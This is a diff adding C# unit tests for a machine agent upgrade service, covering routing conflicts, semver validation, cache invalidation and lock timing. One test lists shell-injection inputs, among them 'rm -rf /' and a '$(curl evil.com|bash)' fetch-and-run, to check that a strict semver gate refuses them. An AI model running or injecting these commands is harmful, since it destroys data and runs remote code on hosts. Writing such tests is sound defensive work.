@@ -159,6 +159,62 @@ public sealed class MachineUpgradeServiceTests
     }
 
     [Fact]
+    public async Task UpgradeAsync_TwoStrategiesClaimSameStyle_ThrowsWithBothClassNames()
+    {
+        // Prevent silent mis-routing when a future refactor accidentally
+        // widens two strategies' CanHandle() to overlap. FirstOrDefault
+        // would pick whichever Autofac registered first — operator sees
+        // no warning, may dispatch to the wrong transport.
+        //
+        // Throwing surfaces the conflict at first trigger (before any
+        // Halibut dispatch, before any real side effect) and names both
+        // conflicting types so the fix is obvious.
+        var rogueStrategy = new Mock<IMachineUpgradeStrategy>();
+        rogueStrategy.Setup(s => s.CanHandle(nameof(CommunicationStyle.TentaclePolling))).Returns(true);
+
+        var service = new MachineUpgradeService(
+            _machineDataProvider.Object,
+            _runtimeCache,
+            _versionRegistry.Object,
+            new[] { _linuxStrategy.Object, rogueStrategy.Object },   // BOTH claim TentaclePolling
+            _redisLock.Object);
+        ArrangeMachine(id: 201, style: nameof(CommunicationStyle.TentaclePolling));
+
+        var ex = await Should.ThrowAsync<InvalidOperationException>(() =>
+            service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 201 }, CancellationToken.None));
+
+        ex.Message.ShouldContain("TentaclePolling");
+        ex.Message.ShouldContain("Each style must have exactly one owner",
+            customMessage: "error must tell the developer what the invariant is, not just what broke");
+    }
+
+    [Theory]
+    [InlineData("")]                              // empty endpoint → missing CommunicationStyle
+    [InlineData("{}")]                            // valid JSON but no CommunicationStyle
+    [InlineData("{\"OtherField\":\"value\"}")]    // valid JSON, no CommunicationStyle either
+    [InlineData("not json at all")]               // unparseable
+    public async Task UpgradeAsync_EndpointJsonMissingCommunicationStyle_ReturnsFailedWithClearMessage(string endpointJson)
+    {
+        // Machine was registered incompletely or is in an inconsistent state.
+        // Previously the service returned NotSupported with an awkward
+        // detail "No upgrade strategy registered for CommunicationStyle ''"
+        // (empty quotes) — no actionable info. Now we return Failed with
+        // a clear remediation hint.
+        _machineDataProvider
+            .Setup(x => x.GetMachinesByIdAsync(99, It.IsAny<CancellationToken>()))
+            .ReturnsAsync(new Machine { Id = 99, Name = "broken-machine", Endpoint = endpointJson, SpaceId = 1 });
+
+        var resp = await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 99 }, CancellationToken.None);
+
+        resp.Status.ShouldBe(MachineUpgradeStatus.Failed);
+        resp.Detail.ShouldContain("endpoint", Case.Insensitive);
+        resp.Detail.ShouldContain("registration",
+            customMessage: "must tell operator where to look (machine registration), not just 'empty quotes style'");
+        resp.Detail.ShouldNotContain("''",
+            customMessage: "previous 'CommunicationStyle \\'\\' not registered' message was unfriendly; must not regress");
+    }
+
+    [Fact]
     public async Task UpgradeAsync_NoStrategyForStyle_ReturnsNotSupportedWithStyleNameInDetail()
     {
         ArrangeMachine(id: 33, style: "Ssh");
@@ -167,6 +223,139 @@ public sealed class MachineUpgradeServiceTests
 
         resp.Status.ShouldBe(MachineUpgradeStatus.NotSupported);
         resp.Detail.ShouldContain("Ssh");
+    }
+
+    [Fact]
+    public async Task UpgradeAsync_NoStrategyForStyleAndRegistryEmpty_ReturnsNotSupported_NotMisleadingNoVersionFailure()
+    {
+        // Bug scenario (audit H-1): SSH style is unknown to BOTH the strategy
+        // registry AND the version registry (registry returns empty for any
+        // unrecognised style). Old order — version-first — surfaced
+        // "Could not resolve target tentacle version: set SQUID_TARGET_LINUX_TENTACLE_VERSION"
+        // which is nonsense advice for an Ssh target.
+        //
+        // Correct behaviour: the moment we know no strategy can act, return
+        // NotSupported with the style name so the operator knows the real cause.
+        ArrangeMachine(id: 88, style: "Ssh");
+        _versionRegistry
+            .Setup(x => x.GetLatestVersionAsync("Ssh", It.IsAny<CancellationToken>()))
+            .ReturnsAsync(string.Empty);
+
+        var resp = await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 88 }, CancellationToken.None);
+
+        resp.Status.ShouldBe(MachineUpgradeStatus.NotSupported);
+        resp.Detail.ShouldContain("Ssh");
+        resp.Detail.ShouldNotContain("SQUID_TARGET_LINUX_TENTACLE_VERSION",
+            customMessage: "must not blame missing version override when the real issue is no strategy for this style");
+    }
+
+    // ========================================================================
+    // Strict semver gate — last line of defence between operator/Docker-Hub
+    // input and the bash template (audit H-3/H-4/H-5).
+    // ========================================================================
+
+    [Theory]
+    [InlineData("1.4.0\";rm -rf /;#")]      // shell-escape attempt
+    [InlineData("1.4.0`whoami`")]            // backtick exec
+    [InlineData("1.4.0$(curl evil.com|bash)")] // command substitution
+    [InlineData("1.4.0\nrm -rf /")]         // newline injection
+    [InlineData("1.4")]                      // 2-component → would build broken URL
+    [InlineData("1.4.0.0")]                  // 4-component → System.Version legacy
+    [InlineData("latest")]                   // garbage tag
+    [InlineData("v1.4.0")]                   // leading 'v' rejected
+    public async Task UpgradeAsync_NonSemverTargetVersion_RejectedBeforeStrategyDispatch(string evilOrMalformedTarget)
+    {
+        // Audit H-5: the bash template did unsanitised .Replace("{{TARGET_VERSION}}", input).
+        // The strict semver gate at the service boundary makes shell-injection
+        // structurally impossible — the upgrade is refused before the embedded
+        // script template ever gets the value.
+        ArrangeMachine(id: 91, style: nameof(CommunicationStyle.TentaclePolling));
+
+        var resp = await _service.UpgradeAsync(
+            new UpgradeMachineCommand { MachineId = 91, TargetVersion = evilOrMalformedTarget },
+            CancellationToken.None);
+
+        resp.Status.ShouldBe(MachineUpgradeStatus.Failed);
+        resp.Detail.ShouldContain("not valid semver");
+        _linuxStrategy.Verify(
+            s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()),
+            Times.Never);
+    }
+
+    [Fact]
+    public async Task UpgradeAsync_PreReleaseTargetVersion_DispatchedNormally()
+    {
+        // Audit H-3: System.Version dropped pre-release tags silently;
+        // SemVer accepts them so canary builds work end-to-end.
+        ArrangeMachine(id: 92, style: nameof(CommunicationStyle.TentaclePolling));
+        _linuxStrategy
+            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "2.0.0-beta.1", It.IsAny<CancellationToken>()))
+            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Upgraded, Detail = "ok" });
+
+        var resp = await _service.UpgradeAsync(
+            new UpgradeMachineCommand { MachineId = 92, TargetVersion = "2.0.0-beta.1" },
+            CancellationToken.None);
+
+        resp.Status.ShouldBe(MachineUpgradeStatus.Upgraded);
+        resp.TargetVersion.ShouldBe("2.0.0-beta.1");
+    }
+
+    [Fact]
+    public async Task UpgradeAsync_PreReleaseCurrentVsStableTarget_PreSkipsCorrectly()
+    {
+        // Audit H-17: with old code, current=1.4.0-beta.1 vs target=1.4.0
+        // fell through to string-equality and dispatched a redundant upgrade
+        // (the agent already runs a NEWER beta but the server thinks not).
+        // Per semver, 1.4.0 > 1.4.0-beta.1, so this is correctly NOT up-to-date.
+        ArrangeMachine(id: 93, style: nameof(CommunicationStyle.TentaclePolling));
+        _runtimeCache.Store(93, new Dictionary<string, string>(), agentVersion: "1.4.0-beta.1");
+        _linuxStrategy
+            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()))
+            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Upgraded, Detail = "promoted from beta" });
+
+        var resp = await _service.UpgradeAsync(
+            new UpgradeMachineCommand { MachineId = 93, TargetVersion = "1.4.0" },
+            CancellationToken.None);
+
+        resp.Status.ShouldBe(MachineUpgradeStatus.Upgraded);
+    }
+
+    [Fact]
+    public async Task UpgradeAsync_StableCurrentVsPreReleaseTarget_NotPreSkipped()
+    {
+        // The reverse: agent on 1.4.0 stable, operator wants to install 1.4.0-beta.1.
+        // Per semver 1.4.0 > 1.4.0-beta.1, so this would be a downgrade. The
+        // service used to silently allow it; with proper compare, "current
+        // already higher than target" → AlreadyUpToDate is the safe answer.
+        ArrangeMachine(id: 94, style: nameof(CommunicationStyle.TentaclePolling));
+        _runtimeCache.Store(94, new Dictionary<string, string>(), agentVersion: "1.4.0");
+
+        var resp = await _service.UpgradeAsync(
+            new UpgradeMachineCommand { MachineId = 94, TargetVersion = "1.4.0-beta.1" },
+            CancellationToken.None);
+
+        resp.Status.ShouldBe(MachineUpgradeStatus.AlreadyUpToDate);
+        _linuxStrategy.Verify(
+            s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()),
+            Times.Never);
+    }
+
+    [Fact]
+    public async Task UpgradeAsync_NoStrategyForStyle_DoesNotInvokeVersionRegistry()
+    {
+        // Optimisation correctness: if no strategy can act, we should not
+        // burn a Docker Hub round-trip looking up a version we'll never use.
+        // Locks in the "strategy-first" ordering — a future refactor that
+        // accidentally re-introduces a registry call before strategy
+        // resolution will trip this assertion.
+        ArrangeMachine(id: 89, style: "Ssh");
+
+        await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 89 }, CancellationToken.None);
+
+        _versionRegistry.Verify(
+            x => x.GetLatestVersionAsync(It.IsAny<string>(), It.IsAny<CancellationToken>()),
+            Times.Never,
+            "no strategy → no need to query version registry");
     }
 
     [Fact]
@@ -192,39 +381,75 @@ public sealed class MachineUpgradeServiceTests
     // making the upgrade appear to "not take" in the UI.
     // ========================================================================
 
-    [Theory]
-    [InlineData(MachineUpgradeStatus.Upgraded)]
-    [InlineData(MachineUpgradeStatus.Initiated)]
-    public async Task UpgradeAsync_OnSuccessOrInitiated_InvalidatesRuntimeCache(MachineUpgradeStatus status)
+    [Fact]
+    public async Task UpgradeAsync_StrategyReportsAgentVersionChanged_InvalidatesRuntimeCache()
     {
+        // Audit N-6: invalidation is now driven by the strategy's explicit
+        // `AgentVersionMayHaveChanged` flag instead of an enum-switch in the
+        // orchestrator. This test no longer cares which Status was returned —
+        // only that the flag means "drop the cache".
         ArrangeMachine(id: 51, style: nameof(CommunicationStyle.TentaclePolling));
         _runtimeCache.Store(51, new Dictionary<string, string>(), agentVersion: "1.0.0");
         _linuxStrategy
             .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()))
-            .ReturnsAsync(new MachineUpgradeOutcome { Status = status, Detail = "ok" });
+            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Upgraded, Detail = "ok", AgentVersionMayHaveChanged = true });
 
         await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 51 }, CancellationToken.None);
 
         _runtimeCache.TryGet(51).AgentVersion.ShouldBeEmpty(
-            "successful/initiated upgrade must drop the cached version so the next health check reads fresh");
+            "AgentVersionMayHaveChanged=true must drop the cached version so the next health check reads fresh");
     }
 
-    [Theory]
-    [InlineData(MachineUpgradeStatus.Failed)]
-    [InlineData(MachineUpgradeStatus.NotSupported)]
-    public async Task UpgradeAsync_OnFailureOrNotSupported_LeavesRuntimeCacheIntact(MachineUpgradeStatus status)
+    [Fact]
+    public async Task UpgradeAsync_StrategyReportsAgentUnchanged_LeavesRuntimeCacheIntact()
     {
         ArrangeMachine(id: 52, style: nameof(CommunicationStyle.TentaclePolling));
         _runtimeCache.Store(52, new Dictionary<string, string>(), agentVersion: "1.0.0");
         _linuxStrategy
             .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()))
-            .ReturnsAsync(new MachineUpgradeOutcome { Status = status, Detail = "not done" });
+            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Failed, Detail = "rolled back", AgentVersionMayHaveChanged = false });
 
         await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 52 }, CancellationToken.None);
 
-        // Still 1.0.0 because the agent is still on 1.0.0 — invalidation
-        // would force a needless capabilities round-trip on next health check.
+        // Cache still 1.0.0 — bash script rolled back, agent still on 1.0.0,
+        // invalidation would force a needless capabilities round-trip.
         _runtimeCache.TryGet(52).AgentVersion.ShouldBe("1.0.0");
+    }
+
+    [Fact]
+    public async Task UpgradeAsync_StatusIsUpgradedButFlagFalse_DoesNotInvalidate_OutcomeFlagWins()
+    {
+        // Belt-and-braces: orchestrator must NOT inspect Status to decide.
+        // If a strategy returns Upgraded but explicitly says "no version
+        // change actually happened" (a hypothetical no-op success), cache
+        // is preserved. This pins the orchestrator's flag-only decision.
+        ArrangeMachine(id: 53, style: nameof(CommunicationStyle.TentaclePolling));
+        _runtimeCache.Store(53, new Dictionary<string, string>(), agentVersion: "1.0.0");
+        _linuxStrategy
+            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()))
+            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Upgraded, Detail = "no-op success", AgentVersionMayHaveChanged = false });
+
+        await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 53 }, CancellationToken.None);
+
+        _runtimeCache.TryGet(53).AgentVersion.ShouldBe("1.0.0",
+            "orchestrator must read the flag, not the Status enum (audit N-6 regression guard)");
+    }
+
+    [Fact]
+    public async Task UpgradeAsync_StatusIsFailedButFlagTrue_DoesInvalidate_OutcomeFlagWins()
+    {
+        // The mirror image: Failed but the strategy is sure the binary did
+        // change (e.g. partial-write detected, agent in unknown state).
+        // Flag wins — invalidate.
+        ArrangeMachine(id: 54, style: nameof(CommunicationStyle.TentaclePolling));
+        _runtimeCache.Store(54, new Dictionary<string, string>(), agentVersion: "1.0.0");
+        _linuxStrategy
+            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()))
+            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Failed, Detail = "partial swap, unknown state", AgentVersionMayHaveChanged = true });
+
+        await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 54 }, CancellationToken.None);
+
+        _runtimeCache.TryGet(54).AgentVersion.ShouldBeEmpty();
     }
 
     // ========================================================================
@@ -254,6 +479,25 @@ public sealed class MachineUpgradeServiceTests
             s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()),
             Times.Never,
             "strategy must NOT run when lock acquisition failed — that is the entire point of the lock");
+    }
+
+    [Fact]
+    public void LockExpiry_StrictlyGreaterThanStrategyTimeout_WithSafetyBuffer()
+    {
+        // Audit H-15 invariant. If the lock TTL expires before the
+        // strategy finishes, a second replica can pick up the now-free
+        // lock and dispatch a DUPLICATE upgrade on the same machine.
+        // The bash-side flock catches it, but the server-side log shows
+        // a redundant attempt which is operator-confusing.
+        //
+        // Buffer = 5 minutes on top of 2×(slowest strategy timeout) so
+        // graceful teardown (observer final poll, cache invalidation,
+        // response shaping) has headroom before the lock releases.
+        var strategyTimeout = LinuxTentacleUpgradeStrategy.UpgradeScriptTimeout;
+        var minimumAcceptableLockExpiry = strategyTimeout + strategyTimeout + TimeSpan.FromMinutes(5);
+
+        MachineUpgradeService.LockExpiry.ShouldBeGreaterThan(minimumAcceptableLockExpiry,
+            $"LockExpiry ({MachineUpgradeService.LockExpiry}) must exceed 2× strategy timeout ({strategyTimeout}) + 5min safety buffer = {minimumAcceptableLockExpiry}. Future strategies with longer timeouts must update LockExpiry together.");
     }
 
     [Fact]
